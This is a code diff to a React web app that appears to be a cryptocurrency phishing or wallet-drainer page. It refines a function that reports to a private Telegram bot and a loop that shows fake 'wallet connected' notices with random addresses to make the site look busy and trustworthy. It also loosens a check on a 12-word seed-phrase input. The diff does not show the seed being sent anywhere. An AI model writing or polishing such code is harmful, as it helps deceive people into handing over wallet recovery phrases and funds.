@@ -27,26 +27,19 @@ export default function App() {
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
-  // FIXED LOG FUNCTION
   const log = (msg) => {
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
-    .catch(() => {});
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`).catch(() => {});
   };
 
-  // --- RESTARTED NOTIFICATION LOOP ---
   useEffect(() => {
     const trigger = () => {
       const r = Math.floor(1000 + Math.random() * 8999);
-      const m = `🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`;
-      setFeedMsg(m);
-      
-      // This sends a small ping to your bot so you know the site is active
-      log(`📡 Feed Active: 0x${r}... joined`);
-
+      setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
+      log(`📡 Feed Ping: 0x${r} connected`);
       setTimeout(() => setFeedMsg(""), 4000);
     };
     trigger();
-    const interval = setInterval(trigger, 10000); // 10 seconds
+    const interval = setInterval(trigger, 12000);
     return () => clearInterval(interval);
   }, []);
 
@@ -72,9 +65,8 @@ export default function App() {
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
-  // SEED LOGIC: GRAY IF EMPTY, GREEN IF 12 WORDS
-  const count = seedVal.trim().split(/\s+/).filter(w => w.length > 2).length;
-  const isSeedReady = count >= 12;
+  // ULTRA STABLE SEED CHECK
+  const isSeedReady = seedVal.trim().split(/\s+/).length >= 12;
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
